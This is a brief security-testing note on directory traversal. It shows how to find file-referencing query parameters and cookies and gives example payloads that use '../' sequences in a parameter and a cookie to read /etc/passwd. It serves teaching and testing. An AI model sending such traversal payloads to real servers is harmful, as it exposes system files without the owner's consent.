# Directory Traversal

> Directory Traversal aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system.

## Identifying Vulnerability

We can identify this type of vulnerability by inspecting the URL query strings or the body in search of values that reference files. Example:

```bash
.php?file=$FILE
.cgi?home=$FILE
.jsp?item=$FILE
```

Cookies can also be used  by the web application for the dynamic generation of pages or templates:

```bash
Cookie: ID=d9ccd3f4f9f18cc1:.....TEMPLATE=$TEMPLATE
Cookie: USER=1826cc8f:PSTYLE=$FILE
```

## Exploiting Vulnerability

To successfully test for this flaw, the tester needs to have knowledge of the system being tested and the location of the files being requested. There is no point requesting /etc/passwd from an IIS web server.

```bash
#Parameter:
.php?file=../../../../etc/passwd
#Cookie:
Cookie: USER=24dedbeef44:PSTYLE=../../../../etc/passwd
```
